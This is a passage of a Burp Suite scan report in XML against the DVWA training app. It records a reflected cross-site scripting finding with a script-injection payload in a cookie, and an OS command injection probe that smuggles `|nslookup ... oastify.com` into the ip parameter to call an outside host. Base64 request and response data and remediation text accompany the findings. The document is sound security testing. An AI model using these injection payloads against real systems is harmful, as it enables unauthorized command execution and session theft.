48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9zZWN1cml0eS5waHAiPkRWV0EgU2VjdXJpdHk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3BocGluZm8ucGhwIj5QSFAgSW5mbzwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vYWJvdXQucGhwIj5BYm91dDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2xvZ291dC5waHAiPkxvZ291dDwvYT48L2xpPgo8L3VsPgoJCQkJPC9kaXY+CgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9Im1haW5fYm9keSI+CgoJCQkJDQo8ZGl2IGNsYXNzPSJib2R5X3BhZGRlZCI+DQoJPGgxPlZ1bG5lcmFiaWxpdHk6IENvbW1hbmQgSW5qZWN0aW9uPC9oMT4NCg0KCTxkaXYgY2xhc3M9InZ1bG5lcmFibGVfY29kZV9hcmVhIj4NCgkJPGgyPlBpbmcgYSBkZXZpY2U8L2gyPg0KDQoJCTxmb3JtIG5hbWU9InBpbmciIGFjdGlvbj0iIyIgbWV0aG9kPSJwb3N0Ij4NCgkJCTxwPg0KCQkJCUVudGVyIGFuIElQIGFkZHJlc3M6DQoJCQkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImlwIiBzaXplPSIzMCI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iU3VibWl0Ij4NCgkJCTwvcD4KCQkJPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0ndXNlcl90b2tlbicgdmFsdWU9JzAwYTU3YzkxOTdhOTFlMzc3OGM4YzMzYzFjZGYwMWJhJyAvPg0KCQk8L2Zvcm0+DQoJCTxwcmU+RVJST1I6IFlvdSBoYXZlIGVudGVyZWQgYW4gaW52YWxpZCBJUC48L3ByZT4NCgk8L2Rpdj4NCg0KCTxoMj5Nb3JlIEluZm9ybWF0aW9uPC9oMj4NCgk8dWw+DQoJCTxsaT48YSBocmVmPSJodHRwczovL3d3dy5zY3JpYmQuY29tL2RvYy8yNTMwNDc2L1BocC1FbmRhbmdlcnMtUmVtb3RlLUNvZGUtRXhlY3V0aW9uIiB0YXJnZXQ9Il9ibGFuayI+aHR0cHM6Ly93d3cuc2NyaWJkLmNvbS9kb2MvMjUzMDQ3Ni9QaHAtRW5kYW5nZXJzLVJlbW90ZS1Db2RlLUV4ZWN1dGlvbjwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cDovL3d3dy5zczY0LmNvbS9iYXNoLyIgdGFyZ2V0PSJfYmxhbmsiPmh0dHA6Ly93d3cuc3M2NC5jb20vYmFzaC88L2E+PC9saT4NCgkJPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cuc3M2NC5jb20vbnQvIiB0YXJnZXQ9Il9ibGFuayI+aHR0cDovL3d3dy5zczY0LmNvbS9udC88L2E+PC9saT4NCgkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vb3dhc3Aub3JnL3d3dy1jb21tdW5pdHkvYXR0YWNrcy9Db21tYW5kX0luamVjdGlvbiIgdGFyZ2V0PSJfYmxhbmsiPmh0dHBzOi8vb3dhc3Aub3JnL3d3dy1jb21tdW5pdHkvYXR0YWNrcy9Db21tYW5kX0luamVjdGlvbjwvYT48L2xpPg0KCTwvdWw+DQo8L2Rpdj4KCgkJCQk8YnIgLz48YnIgLz4KCQkJCQoKCQkJPC9kaXY+CgoJCQk8ZGl2IGNsYXNzPSJjbGVhciI+CgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ic3lzdGVtX2luZm8iPgoJCQkJPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgSGVscCIgY2xhc3M9InBvcHVwX2J1dHRvbiIgaWQ9J2hlbHBfYnV0dG9uJyBkYXRhLWhlbHAtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19oZWxwLnBocD9pZD1leGVjJnNlY3VyaXR5PWhpZ2g3OWNib2RlZmI1JmxvY2FsZT1lbicgKSI+IDxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSJWaWV3IFNvdXJjZSIgY2xhc3M9InBvcHVwX2J1dHRvbiIgaWQ9J3NvdXJjZV9idXR0b24nIGRhdGEtc291cmNlLXVybD0nLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3ZpZXdfc291cmNlLnBocD9pZD1leGVjJnNlY3VyaXR5PWhpZ2g3OWNib2RlZmI1JyApIj4gPGRpdiBhbGlnbj0ibGVmdCI+PGVtPlVzZXJuYW1lOjwvZW0+IGFkbWluPGJyIC8+PGVtPlNlY3VyaXR5IExldmVsOjwvZW0+IGltcG9zc2libGU8YnIgLz48ZW0+TG9jYWxlOjwvZW0+IGVuPGJyIC8+PGVtPlBIUElEUzo8L2VtPiBkaXNhYmxlZDxiciAvPjxlbT5TUUxpIERCOjwvZW0+IG15c3FsPC9kaXY+CgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0iZm9vdGVyIj4KCgkJCQk8cD5EYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIChEVldBKSB2MS4xMCAqRGV2ZWxvcG1lbnQqPC9wPgoJCQkJPHNjcmlwdCBzcmM9Jy4uLy4uLy9kdndhL2pzL2FkZF9ldmVudF9saXN0ZW5lcnMuanMnPjwvc2NyaXB0PgoKCQkJPC9kaXY+CgoJCTwvZGl2PgoKCTwvYm9keT4KCjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2930695243724529664</serialNumber>
    <type>134217728</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.22.0.3">http://web</host>
    <path><![CDATA[/vulnerabilities/exec/]]></path>
    <location><![CDATA[/vulnerabilities/exec/]]></location>
    <severity>Medium</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <issueDetail><![CDATA[The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>ps1xx'&gt;&lt;script&gt;alert(1)&lt;/script&gt;ab5x2kx9klu</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvZXhlYy8/aXA9ZnV6eiZTdWJtaXQ9U3VibWl0IEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvb2tpZTogc2VjdXJpdHk9aGlnaHBzMXh4JyUzZSUzY3NjcmlwdCUzZWFsZXJ0KDEpJTNjJTJmc2NyaXB0JTNlYWI1eDJreDlrbHUNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDE5OjI0OjMzIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD1naThtbWI2ZGFxcDZxazJ2ZnE1OHZmdDZiZTsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KU2V0LUNvb2tpZTogUEhQU0VTU0lEPWdpOG1tYjZkYXFwNnFrMnZmcTU4dmZ0NmJlOyBwYXRoPS87IEh0dHBPbmx5DQpTZXQtQ29va2llOiBzZWN1cml0eT1pbXBvc3NpYmxlOyBwYXRoPS87IEh0dHBPbmx5DQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkNvbnRlbnQtTGVuZ3RoOiA0MjU2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOA0KDQoKPCFET0NUWVBFIGh0bWw+Cgo8aHRtbCBsYW5nPSJlbi1HQiI+CgoJPGhlYWQ+CgkJPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiIC8+CgoJCTx0aXRsZT5WdWxuZXJhYmlsaXR5OiBDb21tYW5kIEluamVjdGlvbiA6OiBEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIChEVldBKSB2MS4xMCAqRGV2ZWxvcG1lbnQqPC90aXRsZT4KCgkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iLi4vLi4vZHZ3YS9jc3MvbWFpbi5jc3MiIC8+CgoJCTxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iXGltYWdlL2ljbyIgaHJlZj0iLi4vLi4vZmF2aWNvbi5pY28iIC8+CgoJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ii4uLy4uL2R2d2EvanMvZHZ3YVBhZ2UuanMiPjwvc2NyaXB0PgoKCTwvaGVhZD4KCgk8Ym9keSBjbGFzcz0iaG9tZSI+CgkJPGRpdiBpZD0iY29udGFpbmVyIj4KCgkJCTxkaXYgaWQ9ImhlYWRlciI+CgoJCQkJPGltZyBzcmM9Ii4uLy4uL2R2d2EvaW1hZ2VzL2xvZ28ucG5nIiBhbHQ9IkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24iIC8+CgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9Im1haW5fbWVudSI+CgoJCQkJPGRpdiBpZD0ibWFpbl9tZW51X3BhZGRlZCI+CgkJCQk8dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi8uIj5Ib21lPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9pbnN0cnVjdGlvbnMucGhwIj5JbnN0cnVjdGlvbnM8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NldHVwLnBocCI+U2V0dXAgLyBSZXNldCBEQjwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9icnV0ZS8iPkJydXRlIEZvcmNlPC9hPjwvbGk+CjxsaSBjbGFzcz0ic2VsZWN0ZWQiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9leGVjLyI+Q29tbWFuZCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3JmLyI+Q1NSRjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2ZpLy4/cGFnZT1pbmNsdWRlLnBocCI+RmlsZSBJbmNsdXNpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy91cGxvYWQvIj5GaWxlIFVwbG9hZDwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NhcHRjaGEvIj5JbnNlY3VyZSBDQVBUQ0hBPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaS8iPlNRTCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9zcWxpX2JsaW5kLyI+U1FMIEluamVjdGlvbiAoQmxpbmQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvd2Vha19pZC8iPldlYWsgU2Vzc2lvbiBJRHM8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3NfZC8iPlhTUyAoRE9NKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19yLyI+WFNTIChSZWZsZWN0ZWQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3MvIj5YU1MgKFN0b3JlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3AvIj5DU1AgQnlwYXNzPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvamF2YXNjcmlwdC8iPkphdmFTY3JpcHQ8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9zZWN1cml0eS5waHAiPkRWV0EgU2VjdXJpdHk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3BocGluZm8ucGhwIj5QSFAgSW5mbzwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vYWJvdXQucGhwIj5BYm91dDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2xvZ291dC5waHAiPkxvZ291dDwvYT48L2xpPgo8L3VsPgoJCQkJPC9kaXY+CgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9Im1haW5fYm9keSI+CgoJCQkJDQo8ZGl2IGNsYXNzPSJib2R5X3BhZGRlZCI+DQoJPGgxPlZ1bG5lcmFiaWxpdHk6IENvbW1hbmQgSW5qZWN0aW9uPC9oMT4NCg0KCTxkaXYgY2xhc3M9InZ1bG5lcmFibGVfY29kZV9hcmVhIj4NCgkJPGgyPlBpbmcgYSBkZXZpY2U8L2gyPg0KDQoJCTxmb3JtIG5hbWU9InBpbmciIGFjdGlvbj0iIyIgbWV0aG9kPSJwb3N0Ij4NCgkJCTxwPg0KCQkJCUVudGVyIGFuIElQIGFkZHJlc3M6DQoJCQkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImlwIiBzaXplPSIzMCI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iU3VibWl0Ij4NCgkJCTwvcD4KCQkJPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0ndXNlcl90b2tlbicgdmFsdWU9JzI4MzM0ZjRkZTg1NWU5NGMzYWUzZjAwMzM2NzllY2UzJyAvPg0KCQk8L2Zvcm0+DQoJCQ0KCTwvZGl2Pg0KDQoJPGgyPk1vcmUgSW5mb3JtYXRpb248L2gyPg0KCTx1bD4NCgkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vd3d3LnNjcmliZC5jb20vZG9jLzI1MzA0NzYvUGhwLUVuZGFuZ2Vycy1SZW1vdGUtQ29kZS1FeGVjdXRpb24iIHRhcmdldD0iX2JsYW5rIj5odHRwczovL3d3dy5zY3JpYmQuY29tL2RvYy8yNTMwNDc2L1BocC1FbmRhbmdlcnMtUmVtb3RlLUNvZGUtRXhlY3V0aW9uPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vd3d3LnNzNjQuY29tL2Jhc2gvIiB0YXJnZXQ9Il9ibGFuayI+aHR0cDovL3d3dy5zczY0LmNvbS9iYXNoLzwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cDovL3d3dy5zczY0LmNvbS9udC8iIHRhcmdldD0iX2JsYW5rIj5odHRwOi8vd3d3LnNzNjQuY29tL250LzwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cHM6Ly9vd2FzcC5vcmcvd3d3LWNvbW11bml0eS9hdHRhY2tzL0NvbW1hbmRfSW5qZWN0aW9uIiB0YXJnZXQ9Il9ibGFuayI+aHR0cHM6Ly9vd2FzcC5vcmcvd3d3LWNvbW11bml0eS9hdHRhY2tzL0NvbW1hbmRfSW5qZWN0aW9uPC9hPjwvbGk+DQoJPC91bD4NCjwvZGl2PgoKCQkJCTxiciAvPjxiciAvPgoJCQkJCgoJCQk8L2Rpdj4KCgkJCTxkaXYgY2xhc3M9ImNsZWFyIj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJzeXN0ZW1faW5mbyI+CgkJCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBIZWxwIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0naGVscF9idXR0b24nIGRhdGEtaGVscC11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X2hlbHAucGhwP2lkPWV4ZWMmc2VjdXJpdHk9aGlnaHBzMXh4Jz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+YWI1eDJreDlrbHUmbG9jYWxlPWVuJyApIj4gPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgU291cmNlIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0nc291cmNlX2J1dHRvbicgZGF0YS1zb3VyY2UtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19zb3VyY2UucGhwP2lkPWV4ZWMmc2VjdXJpdHk9aGlnaHBzMXh4Jz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+YWI1eDJreDlrbHUnICkiPiA8ZGl2IGFsaWduPSJsZWZ0Ij48ZW0+VXNlcm5hbWU6PC9lbT4gYWRtaW48YnIgLz48ZW0+U2VjdXJpdHkgTGV2ZWw6PC9lbT4gaW1wb3NzaWJsZTxiciAvPjxlbT5Mb2NhbGU6PC9lbT4gZW48YnIgLz48ZW0+UEhQSURTOjwvZW0+IGRpc2FibGVkPGJyIC8+PGVtPlNRTGkgREI6PC9lbT4gbXlzcWw8L2Rpdj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJmb290ZXIiPgoKCQkJCTxwPkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3A+CgkJCQk8c2NyaXB0IHNyYz0nLi4vLi4vL2R2d2EvanMvYWRkX2V2ZW50X2xpc3RlbmVycy5qcyc+PC9zY3JpcHQ+CgoJCQk8L2Rpdj4KCgkJPC9kaXY+CgoJPC9ib2R5PgoKPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>277539404601187328</serialNumber>
    <type>134217728</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="172.22.0.3">http://web</host>
    <path><![CDATA[/vulnerabilities/exec/]]></path>
    <location><![CDATA[/vulnerabilities/exec/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The nslookup shell command <b>|nslookup -q=cname gvftvl0l372g8lrpx10o9md4wv2oqeea22psdh.oastify.com.&amp;</b> was submitted in the <b>ip</b> parameter. This payload is designed to trigger a CNAME DNS lookup if the application is vulnerable to OS command injection.<br><br>The application performed a DNS lookup of the specified domain of an unexpected type. This indicates that the server has a component that is parsing out hostnames and making the interaction.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvdnVsbmVyYWJpbGl0aWVzL2V4ZWMvIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvb2tpZTogc2VjdXJpdHk9aGlnaA0KQ29udGVudC1MZW5ndGg6IDIxDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KDQppcD1mdXp6JTdjbnNsb29rdXAlMjAtcSUzZGNuYW1lJTIwZ3ZmdHZsMGwzNzJnOGxycHgxMG85bWQ0d3Yyb3FlZWEyMnBzZGgub2FzdGlmeS5jb20uJTI2JlN1Ym1pdD1TdWJtaXQ=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDE5OjI0OjQzIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD1xb2NkYWFqc285YjQwYW9kaGRkcXVxb2duZDsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogNDMzOQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCjwhRE9DVFlQRSBodG1sPgoKPGh0bWwgbGFuZz0iZW4tR0IiPgoKCTxoZWFkPgoJCTxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPgoKCQk8dGl0bGU+VnVsbmVyYWJpbGl0eTogQ29tbWFuZCBJbmplY3Rpb24gOjogRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiAoRFZXQSkgdjEuMTAgKkRldmVsb3BtZW50KjwvdGl0bGU+CgoJCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii4uLy4uL2R2d2EvY3NzL21haW4uY3NzIiAvPgoKCQk8bGluayByZWw9Imljb24iIHR5cGU9IlxpbWFnZS9pY28iIGhyZWY9Ii4uLy4uL2Zhdmljb24uaWNvIiAvPgoKCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIuLi8uLi9kdndhL2pzL2R2d2FQYWdlLmpzIj48L3NjcmlwdD4KCgk8L2hlYWQ+CgoJPGJvZHkgY2xhc3M9ImhvbWUiPgoJCTxkaXYgaWQ9ImNvbnRhaW5lciI+CgoJCQk8ZGl2IGlkPSJoZWFkZXIiPgoKCQkJCTxpbWcgc3JjPSIuLi8uLi9kdndhL2ltYWdlcy9sb2dvLnBuZyIgYWx0PSJEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIiAvPgoKCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJtYWluX21lbnUiPgoKCQkJCTxkaXYgaWQ9Im1haW5fbWVudV9wYWRkZWQiPgoJCQkJPHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vLiI+SG9tZTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vaW5zdHJ1Y3Rpb25zLnBocCI+SW5zdHJ1Y3Rpb25zPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9zZXR1cC5waHAiPlNldHVwIC8gUmVzZXQgREI8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvYnJ1dGUvIj5CcnV0ZSBGb3JjZTwvYT48L2xpPgo8bGkgY2xhc3M9InNlbGVjdGVkIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZXhlYy8iPkNvbW1hbmQgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NyZi8iPkNTUkY8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9maS8uP3BhZ2U9aW5jbHVkZS5waHAiPkZpbGUgSW5jbHVzaW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvdXBsb2FkLyI+RmlsZSBVcGxvYWQ8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jYXB0Y2hhLyI+SW5zZWN1cmUgQ0